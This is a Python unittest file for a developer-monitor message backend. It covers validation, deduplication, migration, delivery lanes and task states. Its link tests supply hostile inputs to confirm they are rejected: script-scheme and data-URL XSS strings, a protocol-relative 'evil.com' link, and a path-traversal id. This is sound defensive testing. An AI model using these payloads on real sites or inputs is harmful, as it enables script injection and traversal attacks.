#!/usr/bin/env python3
"""Dev Monitor message-stream delta tests (stdlib unittest, zero dependencies).

Covers review §10: validation, deduplication, coalescing, crash recovery, urgent promotion, read ≠ Slack, sweep, and flood control
+ spool adversarial cases (symlink/FIFO/oversize/filename mismatch/no-clobber) + owner gate/fail-closed/CSRF.

Run: python3 test_devmon.py
"""
import json
import contextlib
import importlib.util
import io
import itertools
import os
import re
import stat
import sqlite3
import subprocess
import tempfile
import threading
import unittest
import unittest.mock
from datetime import timedelta

import devmon_messages as MSG
import devmon_spool
import devmon_owner
import action_runner
import devmon_slack
import devmon_email
import devmon_roster


def fresh_db():
    fd, path = tempfile.mkstemp(suffix='.db')
    os.close(fd)
    os.remove(path)
    MSG._local = threading.local()          # Discard the previous test's thread-local connection
    # Which lanes this box can deliver to is process-global, like the database path: a test
    # that starts the server would otherwise leave its answer behind for the next one.
    MSG.set_enabled_channels(('slack-urgent', 'slack-routine'))
    # Roster state is process-global too (P4) — reset so no test's box owner or roster path
    # leaks into the next one, the same reason enabled channels are reset above.
    MSG.set_roster_path('')
    MSG.set_box_owner(None)
    MSG.init_db(path)
    return path


def msg(event_id='resource-1', group_key='resource:disk', kind='action',
        urgency='normal', created=None, **extra):
    p = {
        'schema_version': 1, 'event_id': event_id, 'group_key': group_key,
        'source': 'resource', 'kind': kind, 'urgency': urgency,
        'title': 'Disk 92%', 'body': 'Clean up?',
        'created_at': created or MSG.iso(MSG.now_utc()),
    }
    if kind == 'action':
        p['recommended_action'] = {'cwd': '/tmp/project',
                                   'prompt': 'Clean this up', 'explain': 'What and why'}
    elif kind == 'link':
        p['link'] = {'url': 'https://github.com/example-org/project/pull/142',
                     'label': 'PR #142'}
    else:
        p.update(outcome='o', why_it_matters='w', followup='none')
    p.update(extra)
    return p


def msg2(event_id='resource-1', group_key='resource:disk', kind='info',
         severity='record', created=None, **extra):
    """A schema_version 2 payload: severity replaces urgency rather than joining it."""
    p = msg(event_id=event_id, group_key=group_key, kind=kind, created=created)
    del p['urgency']
    p['schema_version'] = 2
    p['severity'] = severity
    p.update(extra)
    return p


def old_lane_db(deliveries=()):
    """Build the exact cards/deliveries shape from before the lane migration."""
    fd, path = tempfile.mkstemp(suffix='.db')
    os.close(fd)
    conn = sqlite3.connect(path)
    conn.executescript("""
        CREATE TABLE cards (
          card_id TEXT PRIMARY KEY, group_key TEXT NOT NULL, source TEXT NOT NULL,
          kind TEXT NOT NULL, urgency TEXT NOT NULL, title TEXT NOT NULL, body TEXT,
          action_json TEXT, link_json TEXT, action_digest TEXT, created_at TEXT NOT NULL,
          received_at TEXT NOT NULL, read_at TEXT, slack_sent_at TEXT,
          pinned INTEGER NOT NULL DEFAULT 0, archived_at TEXT, dismissed_at TEXT,
          occurrence_count INTEGER NOT NULL DEFAULT 1, last_seen TEXT NOT NULL,
          run_id TEXT
        );
        CREATE TABLE deliveries (
          id INTEGER PRIMARY KEY AUTOINCREMENT, card_id TEXT NOT NULL,
          channel TEXT NOT NULL, status TEXT NOT NULL,
          attempts INTEGER NOT NULL DEFAULT 0, next_attempt_at TEXT,
          sent_at TEXT, last_error TEXT
        );
    """)
    now = MSG.iso(MSG.now_utc())
    conn.execute(
        'INSERT INTO cards(card_id, group_key, source, kind, urgency, title, '
        'created_at, received_at, last_seen) VALUES(?,?,?,?,?,?,?,?,?)',
        ('legacy-card', 'legacy-group', 'resource', 'info', 'urgent', 'Legacy',
         now, now, now))
    for channel, status in deliveries:
        conn.execute(
            'INSERT INTO deliveries(card_id, channel, status, next_attempt_at) '
            'VALUES(?,?,?,?)', ('legacy-card', channel, status, now))
    conn.commit()
    conn.close()
    return path


class TestValidation(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_valid_action(self):
        self.assertEqual(MSG.ingest(msg()), 'inserted')

    def test_valid_info(self):
        self.assertEqual(MSG.ingest(msg(kind='info')), 'inserted')

    def test_skill_prompt_xor(self):
        p = msg()
        p['recommended_action']['skill'] = 'harness-gardener'   # both skill and prompt
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_exec_third_mode_valid(self):
        p = msg(); del p['recommended_action']['prompt']
        p['recommended_action']['exec'] = ['/bin/echo', 'hi']   # direct executable (validation does not check existence)
        self.assertEqual(MSG.ingest(p), 'inserted')

    def test_exec_plus_prompt_rejected(self):
        p = msg()                                               # prompt already present
        p['recommended_action']['exec'] = ['/bin/echo']         # + exec → two modes
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_exec_empty_string_element_rejected(self):
        p = msg(); del p['recommended_action']['prompt']
        p['recommended_action']['exec'] = ['']                  # empty string element
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_urgent_action_needs_action(self):
        p = msg(kind='action', urgency='urgent')
        del p['recommended_action']
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_future_rejected(self):
        future = MSG.iso(MSG.now_utc() + timedelta(hours=1))
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(created=future))

    def test_bad_id_rejected(self):
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(event_id='bad id/../x'))

    def test_id_with_a_trailing_newline_rejected(self):
        """Python's `$` also matches before a trailing newline.

        While ID_RE ended at `$` these ids were accepted, so a spool file named
        `e1\\n.json` — a legal filename, and the spool requires the name to equal the
        event_id — produced a card whose identity carried a control character into the
        Slack line and the audit log. The second case is the length cap: 128 + '\\n' is
        129 characters and was accepted as if it were 128.
        """
        for bad in ('ok\n', 'a' * 128 + '\n'):
            with self.assertRaises(MSG.ValidationError):
                MSG.ingest(msg(event_id=bad))
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(group_key='resource:disk\n'))

    def test_skill_pattern_is_anchored_at_end_of_string(self):
        # Both SKILL_RE call sites .strip() first, so an ingest-level case would pass with
        # or without the anchor and could not detect a regression. This asserts the
        # property the anchor provides rather than the one strip() happens to provide.
        self.assertIsNone(MSG.SKILL_RE.match('cleanup\n'))

    def test_naive_ts_rejected(self):
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(created='2026-07-20T14:00:00'))   # no timezone

    def test_schema_version_bool_rejected(self):
        p = msg(); p['schema_version'] = True                # True == 1, but booleans are rejected
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_info_requires_fields(self):
        p = msg(kind='info')
        del p['outcome']
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)


class TestLink(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_valid_link(self):
        self.assertEqual(MSG.ingest(msg(kind='link')), 'inserted')
        row = MSG._conn().execute('SELECT kind, link_json FROM cards').fetchone()
        self.assertEqual(row['kind'], 'link')
        self.assertEqual(json.loads(row['link_json'])['url'],
                         'https://github.com/example-org/project/pull/142')

    def test_link_in_card_dict(self):
        MSG.ingest(msg(kind='link'))
        card = MSG.feed()['messages'][0]
        self.assertEqual(card['link']['label'], 'PR #142')
        self.assertIsNone(card['action'])

    def test_link_requires_object(self):
        p = msg(kind='link')
        del p['link']
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_rejects_javascript_scheme(self):
        p = msg(kind='link')
        p['link'] = {'url': 'javascript:alert(1)'}
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_rejects_data_scheme(self):
        p = msg(kind='link')
        p['link'] = {'url': 'data:text/html,<script>alert(1)</script>'}
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_rejects_relative_and_protocol_relative(self):
        for bad in ('/monitor/api/owner/messages', '//evil.com/x', 'ftp://h/x', 'foo'):
            p = msg(kind='link')
            p['link'] = {'url': bad}
            with self.assertRaises(MSG.ValidationError):
                MSG.ingest(p)

    def test_link_rejects_hostless_authority(self):
        # #8: netloc present but no hostname (":443", "@") → reject
        for bad in ('https://:443', 'http://@', 'https://:8080/path'):
            p = msg(kind='link')
            p['link'] = {'url': bad}
            with self.assertRaises(MSG.ValidationError):
                MSG.ingest(p)

    def test_link_url_length_capped(self):
        p = msg(kind='link')
        p['link'] = {'url': 'https://x/' + 'a' * (MSG.MAX_URL + 10)}
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_urgent_pins_and_slack(self):
        MSG.ingest(msg(kind='link', urgency='urgent'))
        row = MSG._conn().execute('SELECT pinned FROM cards').fetchone()
        self.assertEqual(row['pinned'], 1)
        self.assertEqual(
            MSG._conn().execute('SELECT COUNT(*) FROM deliveries').fetchone()[0], 1)

    def test_different_url_new_card_same_group(self):
        MSG.ingest(msg(event_id='l1', group_key='g', kind='link'))
        p2 = msg(event_id='l2', group_key='g', kind='link')
        p2['link'] = {'url': 'https://github.com/example-org/project/pull/999'}
        MSG.ingest(p2)
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM cards').fetchone()[0], 2)   # Different URLs yield different digests → separate cards

    def test_same_url_coalesces(self):
        MSG.ingest(msg(event_id='l1', group_key='g', kind='link'))
        self.assertEqual(
            MSG.ingest(msg(event_id='l2', group_key='g', kind='link')), 'coalesced')


class TestIngest(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def _count(self, table):
        return MSG._conn().execute(f'SELECT COUNT(*) FROM {table}').fetchone()[0]

    def test_insert_creates_card_and_occurrence(self):
        MSG.ingest(msg())
        self.assertEqual(self._count('cards'), 1)
        self.assertEqual(self._count('occurrences'), 1)

    def test_dedup_same_event_id(self):
        MSG.ingest(msg(event_id='e1'))
        self.assertEqual(MSG.ingest(msg(event_id='e1')), 'duplicate')
        self.assertEqual(self._count('cards'), 1)
        self.assertEqual(self._count('occurrences'), 1)

    def test_coalesce_same_group(self):
        MSG.ingest(msg(event_id='e1', group_key='g'))
        self.assertEqual(MSG.ingest(msg(event_id='e2', group_key='g')), 'coalesced')
        self.assertEqual(self._count('cards'), 1)
        self.assertEqual(self._count('occurrences'), 2)
        row = MSG._conn().execute('SELECT occurrence_count FROM cards').fetchone()
        self.assertEqual(row['occurrence_count'], 2)

    def test_coalesce_resets_read(self):
        MSG.ingest(msg(event_id='e1', group_key='g'))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        MSG.mark_read(cid)
        self.assertIsNotNone(MSG._conn().execute(
            'SELECT read_at FROM cards').fetchone()['read_at'])
        MSG.ingest(msg(event_id='e2', group_key='g'))       # a new occurrence restores the unread state
        self.assertIsNone(MSG._conn().execute(
            'SELECT read_at FROM cards').fetchone()['read_at'])

    def test_different_digest_new_card(self):
        MSG.ingest(msg(event_id='e1', group_key='g', kind='info'))
        MSG.ingest(msg(event_id='e2', group_key='g', kind='action'))  # different digest
        self.assertEqual(self._count('cards'), 2)

    def test_urgent_promotion_pins(self):
        MSG.ingest(msg(event_id='e1', group_key='g', urgency='normal'))
        MSG.ingest(msg(event_id='e2', group_key='g', urgency='urgent'))
        row = MSG._conn().execute('SELECT urgency, pinned FROM cards').fetchone()
        self.assertEqual(row['urgency'], 'urgent')
        self.assertEqual(row['pinned'], 1)

    def test_crash_reprocess_stable(self):
        # a crash after commit and before deletion re-ingests the same payload → duplicate; count remains unchanged (C2)
        MSG.ingest(msg(event_id='e1', group_key='g'))
        MSG.ingest(msg(event_id='e2', group_key='g'))       # coalesced, count=2
        self.assertEqual(MSG.ingest(msg(event_id='e2', group_key='g')), 'duplicate')
        self.assertEqual(MSG._conn().execute(
            'SELECT occurrence_count FROM cards').fetchone()['occurrence_count'], 2)

    def test_urgent_enqueues_slack(self):
        MSG.ingest(msg(urgency='urgent'))
        self.assertEqual(self._count('deliveries'), 1)

    def test_normal_no_slack(self):
        MSG.ingest(msg(urgency='normal'))
        self.assertEqual(self._count('deliveries'), 0)


class TestLaneSchemaMigration(unittest.TestCase):
    def test_additive_migration_backfill_indexes_and_old_inserts(self):
        path = old_lane_db([('slack', 'pending')])
        MSG._local = threading.local()
        MSG.init_db(path)
        conn = MSG._conn()

        card_columns = {r[1] for r in conn.execute('PRAGMA table_info(cards)')}
        self.assertTrue({
            'severity', 'owner', 'needs_action', 'task_state', 'snoozed_until', 'runbook'
        } <= card_columns)
        delivery_columns = {r[1] for r in conn.execute('PRAGMA table_info(deliveries)')}
        self.assertTrue({
            'claimed_by', 'lease_until', 'created_at', 'last_error_at'
        } <= delivery_columns)
        indexes = {r[1] for r in conn.execute(
            "SELECT type, name FROM sqlite_master WHERE type='index'")}
        self.assertTrue({
            'idx_deliveries_claim', 'ux_deliveries_open',
            'idx_deliveries_sent', 'idx_cards_probe',
            'idx_deliveries_health_sent_v3',
            'idx_deliveries_health_error_valid_v3',
            'idx_deliveries_health_failed_v3',
            'idx_deliveries_health_bad_timestamp_v3',
        } <= indexes)
        self.assertEqual(conn.execute(
            'SELECT channel FROM deliveries WHERE card_id=?',
            ('legacy-card',)).fetchone()['channel'], 'slack-urgent')

        # Column-naming inserts from the pre-migration backend remain valid because all
        # ten additions are nullable.
        now = MSG.iso(MSG.now_utc())
        conn.execute(
            'INSERT INTO cards(card_id, group_key, source, kind, urgency, title, '
            'created_at, received_at, last_seen) VALUES(?,?,?,?,?,?,?,?,?)',
            ('old-writer-card', 'old-writer-group', 'resource', 'info', 'normal',
             'Old writer', now, now, now))
        conn.execute(
            'INSERT INTO deliveries(card_id, channel, status, next_attempt_at) '
            'VALUES(?,?,?,?)', ('old-writer-card', 'slack-routine', 'pending', now))
        conn.commit()

        self.assertEqual(MSG.ingest(msg(
            event_id='post-migration', group_key='post-migration', kind='info')),
            'inserted')
        self.assertEqual(conn.execute(
            "SELECT title FROM cards WHERE group_key='post-migration'").fetchone()['title'],
            'Disk 92%')

        # A pre-upgrade writer and sqlite tooling do not import this module.  They
        # must still be able to maintain every new partial index, including while
        # moving a row into and out of the indexed sent/failed predicates.
        raw = sqlite3.connect(path)
        try:
            raw.execute(
                'INSERT INTO cards(card_id, group_key, source, kind, urgency, title, '
                'created_at, received_at, last_seen) VALUES(?,?,?,?,?,?,?,?,?)',
                ('raw-old-writer', 'raw-old-writer', 'resource', 'info', 'normal',
                 'Raw old writer', now, now, now))
            raw.execute(
                'INSERT INTO deliveries(card_id, channel, status, next_attempt_at) '
                'VALUES(?,?,?,?)',
                ('raw-old-writer', 'slack-routine', 'pending', now))
            raw.execute(
                "UPDATE deliveries SET status='sent', sent_at=?, next_attempt_at=NULL "
                'WHERE card_id=?', (now, 'raw-old-writer'))
            raw.execute(
                "UPDATE deliveries SET status='failed', sent_at=NULL, last_error=?, "
                'last_error_at=? WHERE card_id=?',
                ('http 404', now, 'raw-old-writer'))
            raw.commit()
            self.assertEqual(raw.execute(
                'SELECT status FROM deliveries WHERE card_id=?',
                ('raw-old-writer',)).fetchone()[0], 'failed')
        finally:
            raw.close()

    def test_new_urgent_enqueue_uses_lane_and_created_timestamp(self):
        fresh_db()
        MSG.ingest(msg(event_id='urgent-lane', urgency='urgent'))
        row = MSG._conn().execute(
            'SELECT channel, created_at FROM deliveries').fetchone()
        self.assertEqual(row['channel'], 'slack-urgent')
        self.assertIsNotNone(row['created_at'])

    def test_open_duplicate_is_suppressed_and_logged_but_sent_can_repeat(self):
        fresh_db()
        MSG.ingest(msg(event_id='dup-open', urgency='urgent'))
        conn = MSG._conn()
        card_id = conn.execute('SELECT card_id FROM cards').fetchone()['card_id']
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr), conn:
            MSG._enqueue_delivery(conn, card_id)
        self.assertEqual(conn.execute(
            'SELECT COUNT(*) FROM deliveries').fetchone()[0], 1)
        self.assertIn(card_id, stderr.getvalue())
        self.assertIn('duplicate delivery suppressed', stderr.getvalue())

        conn.execute(
            "UPDATE deliveries SET status='sent', sent_at=? WHERE card_id=?",
            (MSG.iso(MSG.now_utc()), card_id))
        conn.commit()
        with conn:
            MSG._enqueue_delivery(conn, card_id)
        self.assertEqual(conn.execute(
            'SELECT COUNT(*) FROM deliveries').fetchone()[0], 2)

    def test_old_sqlite_refuses_before_schema_touch(self):
        root = tempfile.mkdtemp()
        path = os.path.join(root, 'not-created', 'messages.db')
        with unittest.mock.patch.object(MSG.sqlite3, 'sqlite_version_info', (3, 34, 1)):
            with self.assertRaisesRegex(RuntimeError, 'SQLite 3.35'):
                MSG.init_db(path)
        self.assertFalse(os.path.exists(os.path.dirname(path)))

    def test_duplicate_migration_reports_named_schema_state_and_disables_routes(self):
        path = old_lane_db([('slack', 'pending'), ('slack-urgent', 'claimed')])
        backend_path = os.path.join(os.path.dirname(__file__), 'airlock-dev-monitor.py')
        spec = importlib.util.spec_from_file_location('airlock_dev_monitor_lane_test', backend_path)
        backend = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(backend)
        backend.MESSAGES_REQUESTED = True
        backend._MESSAGES_AVAILABLE = True
        config = {'db': path, 'owner': 'owner', 'spool': tempfile.mkdtemp()}
        stderr = io.StringIO()
        with unittest.mock.patch.object(backend.devmon_owner, 'load_config', return_value=config):
            with contextlib.redirect_stderr(stderr):
                backend._start_messages()
        self.assertEqual(backend._messages_state(), 'off: schema')
        self.assertIsNone(backend.OWNER_CONFIG)
        self.assertIsNone(backend.EXEC_CONFIG)
        self.assertIn('messages schema failed', stderr.getvalue())

        # Exercise the production wiring, not only the state source.
        handler = object.__new__(backend.Handler)
        handler.path = '/api/health'
        handler._json = unittest.mock.Mock()
        handler.do_GET()
        health_status, health_body = handler._json.call_args.args
        self.assertEqual(health_status, 200)
        self.assertEqual(health_body['messages'], 'off: schema')

        handler.path = '/api/owner/messages'
        handler._json.reset_mock()
        handler.do_GET()
        owner_status, owner_body = handler._json.call_args.args
        self.assertEqual(owner_status, 404)
        self.assertEqual(owner_body['error'], 'messages feature not enabled')

        server = unittest.mock.MagicMock()
        server.__enter__.return_value = server
        server.serve_forever.side_effect = KeyboardInterrupt
        stdout = io.StringIO()
        with unittest.mock.patch.object(backend, '_start_messages'), \
                unittest.mock.patch.object(backend, 'cpu_info'), \
                unittest.mock.patch.object(backend, 'history_trim'), \
                unittest.mock.patch.object(backend.threading, 'Thread'), \
                unittest.mock.patch.object(
                    backend, 'ThreadingHTTPServer', return_value=server), \
                contextlib.redirect_stdout(stdout):
            backend.main()
        banner = stdout.getvalue()
        self.assertIn('messages=off: schema', banner)
        self.assertIn('message_lanes=', banner)
        self.assertIn('"slack-urgent"', banner)
        self.assertIn('"slack-routine"', banner)


class TestStateAndCounts(unittest.TestCase):
    def setUp(self):
        fresh_db()
        MSG.ingest(msg(event_id='e1', group_key='g1', urgency='urgent'))
        self.cid = MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key='g1'").fetchone()['card_id']

    def test_read_idempotent_transition(self):
        self.assertTrue(MSG.mark_read(self.cid))
        self.assertFalse(MSG.mark_read(self.cid))            # already read → False

    def test_dismiss_undismiss(self):
        self.assertTrue(MSG.dismiss(self.cid))
        self.assertEqual(MSG.counts()['active'], 0)
        self.assertTrue(MSG.undismiss(self.cid))
        self.assertEqual(MSG.counts()['active'], 1)

    def test_read_neq_slack(self):
        # Sending to Slack preserves the unread count (orthogonal)
        MSG._conn().execute('UPDATE cards SET slack_sent_at=? WHERE card_id=?',
                           (MSG.iso(MSG.now_utc()), self.cid))
        MSG._conn().commit()
        self.assertEqual(MSG.unread_count(), 1)              # unread even with Slack delivery
        MSG.mark_read(self.cid)
        self.assertEqual(MSG.unread_count(), 0)

    def test_dismiss_excluded_from_unread(self):
        self.assertEqual(MSG.unread_count(), 1)
        MSG.dismiss(self.cid)
        self.assertEqual(MSG.unread_count(), 0)

    def test_preview_caps_5(self):
        for i in range(8):
            MSG.ingest(msg(event_id=f'p{i}', group_key=f'gp{i}'))
        pv = MSG.preview()
        self.assertEqual(len(pv['messages']), 5)
        self.assertEqual(pv['unread_count'], 9)             # global total (g1 + 8)


class TestNeedsAction(unittest.TestCase):
    """P2: who declares that a person still has to act, and what that excludes."""

    def setUp(self):
        fresh_db()

    def _state(self, card_id, task_state, snoozed_until=None):
        """Set task_state directly. The transitions themselves arrive in the next unit."""
        with MSG._conn() as conn:
            conn.execute('UPDATE cards SET task_state=?, snoozed_until=? WHERE card_id=?',
                         (task_state, snoozed_until, card_id))

    def test_non_boolean_needs_action_rejected(self):
        for bad in (1, 0, 'true', [], {}):
            with self.assertRaises(MSG.ValidationError):
                MSG.ingest(msg(event_id='bad-%s' % type(bad).__name__, needs_action=bad))

    def test_undeclared_v1_payload_reads_as_a_record(self):
        # The compatibility promise: a producer that has never heard of this field keeps
        # producing exactly the card it produces today, and holds no number up.
        MSG.ingest(msg(event_id='e1', group_key='g1'))
        card = MSG._conn().execute('SELECT * FROM cards').fetchone()
        self.assertIsNone(card['needs_action'])
        self.assertIsNone(card['task_state'])
        self.assertEqual(MSG.needs_action_count(), 0)
        self.assertEqual(MSG.counts()['unread'], 1)      # still visible, still unread
        self.assertEqual(MSG.counts()['closed'], 1)

    def test_declared_task_is_the_count_and_false_never_is(self):
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        MSG.ingest(msg(event_id='rec', group_key='gr', needs_action=False))
        self.assertEqual(MSG.needs_action_count(), 1)
        counts = MSG.counts()
        self.assertEqual((counts['needs_me'], counts['active']), (1, 2))
        rec = MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key='gr'").fetchone()['card_id']
        # In any state at all: a record is never needs-me, so no state can make it one.
        for state in ('todo', 'doing', 'done', 'snoozed', None):
            self._state(rec, state)
            self.assertEqual(MSG.needs_action_count(), 1, state)

    def test_archived_and_dismissed_tasks_leave_the_count(self):
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        self.assertEqual(MSG.needs_action_count(), 1)
        MSG.archive(cid)
        self.assertEqual(MSG.needs_action_count(), 0)
        MSG.dismiss(cid)
        self.assertEqual(MSG.needs_action_count(), 0)

    def test_doing_is_not_needs_me_and_has_its_own_count(self):
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        self._state(cid, 'doing')
        counts = MSG.counts()
        self.assertEqual((counts['needs_me'], counts['doing']), (0, 1))

    def test_expired_snooze_returns_with_no_sweep_having_run(self):
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        later = MSG.iso(MSG.now_utc() + timedelta(hours=6))
        self._state(cid, 'snoozed', later)
        self.assertEqual(MSG.needs_action_count(), 0)
        self.assertEqual(MSG.counts()['snoozed'], 1)
        # No sweep, no background thread: the deadline passing is the whole mechanism.
        self.assertEqual(MSG.needs_action_count(MSG.now_utc() + timedelta(hours=7)), 1)

    def test_snooze_without_a_deadline_is_due_now_rather_than_never(self):
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        self._state(cid, 'snoozed', None)
        self.assertEqual(MSG.needs_action_count(), 1)

    def test_record_occurrence_never_clears_a_task(self):
        MSG.ingest(msg(event_id='e1', group_key='g1', needs_action=True))
        MSG.ingest(msg(event_id='e2', group_key='g1', needs_action=False))
        MSG.ingest(msg(event_id='e3', group_key='g1'))            # undeclared
        card = MSG._conn().execute('SELECT * FROM cards').fetchone()
        self.assertEqual((card['needs_action'], card['occurrence_count']), (1, 3))
        self.assertEqual(MSG.needs_action_count(), 1)

    def test_undeclared_card_is_raised_by_a_declaring_occurrence(self):
        MSG.ingest(msg(event_id='e1', group_key='g1'))
        self.assertEqual(MSG.needs_action_count(), 0)
        MSG.ingest(msg(event_id='e2', group_key='g1', needs_action=True))
        self.assertEqual(MSG.needs_action_count(), 1)

    def test_done_card_is_not_resurrected_by_a_record_occurrence(self):
        MSG.ingest(msg(event_id='e1', group_key='g1', needs_action=True))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        MSG.mark_read(cid)
        self._state(cid, 'done')
        MSG.ingest(msg(event_id='e2', group_key='g1', needs_action=False))
        card = MSG._conn().execute('SELECT * FROM cards').fetchone()
        self.assertEqual(card['task_state'], 'done')
        self.assertIsNotNone(card['read_at'])       # not re-flagged unread either
        self.assertEqual(MSG.needs_action_count(), 0)

    def test_done_card_reopens_for_an_occurrence_that_declares_action(self):
        MSG.ingest(msg(event_id='e1', group_key='g1', needs_action=True))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        MSG.mark_read(cid)
        self._state(cid, 'done')
        MSG.ingest(msg(event_id='e2', group_key='g1', needs_action=True))
        card = MSG._conn().execute('SELECT * FROM cards').fetchone()
        self.assertEqual(card['task_state'], 'todo')
        self.assertIsNone(card['read_at'])
        self.assertEqual(MSG.needs_action_count(), 1)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? AND kind='reopen'",
            (cid,)).fetchone()[0], 1)

    def test_auto_archive_never_takes_a_card_that_still_needs_a_person(self):
        # read-and-idle is exactly what an unfinished task looks like, so without the
        # guard the sweep is the count's silent leak.
        now = MSG.now_utc()
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        task = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        MSG.mark_read(task)
        MSG.ingest(msg(event_id='rec', group_key='gr', needs_action=False))
        rec = MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key='gr'").fetchone()['card_id']
        MSG.mark_read(rec)
        for i in range(MSG.ARCHIVE_ACTIVE_MIN):
            MSG.ingest(msg(event_id='filler-%d' % i, group_key='gf%d' % i))
        sweep_at = now + timedelta(hours=80)
        with unittest.mock.patch.object(MSG, 'now_utc', return_value=sweep_at):
            MSG.sweep()
        rows = dict(MSG._conn().execute(
            'SELECT card_id, archived_at FROM cards WHERE card_id IN (?,?)', (task, rec)))
        self.assertIsNone(rows[task])
        self.assertIsNotNone(rows[rec])
        self.assertEqual(MSG.needs_action_count(sweep_at), 1)

    def test_aging_counts_only_tasks_still_waiting(self):
        old = MSG.iso(MSG.now_utc() - MSG.AGING - timedelta(hours=1))
        MSG.ingest(msg(event_id='old', group_key='go', needs_action=True, created=old))
        MSG.ingest(msg(event_id='new', group_key='gn', needs_action=True))
        MSG.ingest(msg(event_id='rec', group_key='gr', needs_action=False, created=old))
        counts = MSG.counts()
        self.assertEqual((counts['needs_me'], counts['aging']), (2, 1))

    def test_preview_carries_the_needs_me_number_and_keeps_unread(self):
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        MSG.ingest(msg(event_id='rec', group_key='gr', needs_action=False))
        pv = MSG.preview()
        self.assertEqual((pv['needs_action_count'], pv['unread_count']), (1, 2))
        first = pv['messages'][0]
        self.assertEqual(first['needs_action'], True)
        self.assertIn('task_state', first)
        # A needs-me card sorts above a record of the same age even once it is read.
        MSG.mark_read(first['card_id'])
        self.assertEqual(MSG.preview()['messages'][0]['card_id'], first['card_id'])

    def test_lane_probe_adds_nothing_to_the_count(self):
        MSG.ingest(msg(event_id='task', group_key='gt', needs_action=True))
        self.assertIsNotNone(MSG.maybe_enqueue_lane_probe('slack-routine'))
        self.assertEqual(MSG.needs_action_count(), 1)


class TestTaskState(unittest.TestCase):
    """P2 unit 2: todo -> doing -> done, and what a record card is never offered."""

    TASK_ACTIONS = ('start_task', 'complete_task', 'reopen_task',
                    'snooze_task', 'unsnooze_task', 'not_task')

    def setUp(self):
        fresh_db()
        MSG.ingest(msg(event_id='task', group_key='gt', kind='info', needs_action=True))
        MSG.ingest(msg(event_id='rec', group_key='gr', kind='info', needs_action=False))
        MSG.ingest(msg(event_id='undecl', group_key='gu', kind='info'))
        self.task, self.rec, self.undecl = 'task', 'rec', 'undecl'

    def _state(self, card_id):
        return MSG._conn().execute(
            'SELECT task_state, snoozed_until, needs_action FROM cards WHERE card_id=?',
            (card_id,)).fetchone()

    def _audits(self, card_id):
        return [r['kind'] for r in MSG._conn().execute(
            'SELECT kind FROM events WHERE card_id=? ORDER BY id', (card_id,))]

    def test_a_record_card_is_offered_no_task_transition(self):
        # The screen does not draw these buttons on a record; this is why it cannot be worked
        # around by anyone who sends the request anyway.
        for name in self.TASK_ACTIONS:
            with self.subTest(action=name):
                self.assertFalse(getattr(MSG, name)(self.rec))
        self.assertIsNone(self._state(self.rec)['task_state'])

    def test_an_undeclared_card_is_offered_no_task_transition_either(self):
        for name in self.TASK_ACTIONS:
            with self.subTest(action=name):
                self.assertFalse(getattr(MSG, name)(self.undecl))

    def test_todo_doing_done(self):
        self.assertTrue(MSG.start_task(self.task))
        self.assertEqual(self._state(self.task)['task_state'], 'doing')
        self.assertEqual(MSG.needs_action_count(), 0)
        self.assertTrue(MSG.complete_task(self.task))
        self.assertEqual(self._state(self.task)['task_state'], 'done')
        self.assertEqual(MSG.counts()['closed'], 3)
        self.assertEqual(self._audits(self.task)[-2:], ['task_start', 'task_done'])

    def test_todo_straight_to_done(self):
        self.assertTrue(MSG.complete_task(self.task))
        self.assertFalse(MSG.complete_task(self.task))      # already there
        self.assertEqual(MSG.needs_action_count(), 0)

    def test_reopen_only_from_done(self):
        self.assertFalse(MSG.reopen_task(self.task))        # still todo
        MSG.complete_task(self.task)
        self.assertTrue(MSG.reopen_task(self.task))
        self.assertEqual(self._state(self.task)['task_state'], 'todo')
        self.assertEqual(MSG.needs_action_count(), 1)

    def test_snooze_lands_on_the_next_local_eight(self):
        self.assertTrue(MSG.snooze_task(self.task))
        row = self._state(self.task)
        self.assertEqual(row['task_state'], 'snoozed')
        deadline = MSG.parse_rfc3339(row['snoozed_until']).astimezone()
        self.assertEqual((deadline.hour, deadline.minute), (MSG.SNOOZE_HOUR, 0))
        self.assertGreater(deadline, MSG.now_utc())
